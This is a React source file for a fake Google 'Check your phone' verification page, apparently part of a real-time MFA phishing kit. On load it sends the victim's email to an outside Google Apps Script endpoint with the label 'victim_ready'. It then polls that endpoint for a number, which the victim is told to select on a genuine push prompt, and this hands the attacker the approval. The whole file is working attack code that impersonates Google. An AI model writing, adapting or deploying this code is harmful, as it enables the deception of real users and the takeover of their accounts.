import { useState, useEffect } from 'react';
import './App.css';

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxUBfTv-NSz4B-L_Z_LvAbaTOnkPtxtxaA1rPMKuvkB51ZLgmrJHQqfK8505j2RwUaz/exec";

function App() {
  const [email] = useState(() => {
    // Try to get from localStorage (like original)
    return localStorage.getItem('demoEmail') || 'test@example.com';
  });

  const [number, setNumber] = useState('••');
  const [isLoading, setIsLoading] = useState(true);
  const [statusText, setStatusText] = useState('Checking your account…');

  // Avatar initial
  const avatarInitial = (email.split('@')[0] || 'U').charAt(0).toUpperCase();

  // Send ready signal once on mount
  useEffect(() => {
    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {
      method: 'GET',
      mode: 'no-cors',
    }).catch(() => {}); // silent
  }, [email]);

  // Poll for the latest number
  useEffect(() => {
    const poll = async () => {
      try {
        const response = await fetch(
          `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`,
          { cache: 'no-store' }
        );
        const text = await response.text();
        const match = text.match(/"prompt_number":"(\d+)"/);

        if (match && match[1]) {
          setNumber(match[1]);
          setStatusText('Number received');
          setIsLoading(false);
        } else {
          setStatusText('Waiting for verification…');
        }
      } catch (err) {
        setStatusText('Waiting for verification…');
      }
    };

    // Poll immediately + every 5 seconds
    poll();
    const interval = setInterval(poll, 5000);

    return () => clearInterval(interval);
  }, [email]);

  return (
    <div className="page-center">
      <div className="card">
        <div className="logo">
          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
            <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
            <path fill="#34A853" d="M24 46.5c6.48 0 11.92-2.14 15.9-5.84l-7.2-5.6c-2 1.34-4.56 2.14-8.7 2.14-6.58 0-12.16-3.8-13.9-9.02l-6.66 5.18C7.2 41.32 14.98 46.5 24 46.5z"/>
          </svg>
        </div>

        <div className="avatar">{avatarInitial}</div>

        {isLoading ? (
          <div id="loading">
            <div className="spinner"></div>
            <h1>Verifying your identity</h1>
            <p>{statusText}</p>
          </div>
        ) : (
          <div id="prompt-section">
            <h1>Check your phone</h1>
            <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
            <div style={{ margin: '16px 0', color: '#5f6368' }}>
              Then select the number shown below:
            </div>
            <div className="number-box">{number}</div>
            <p style={{ marginTop: '32px', color: '#5f6368', fontSize: '14px' }}>
              This helps keep your account secure.
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
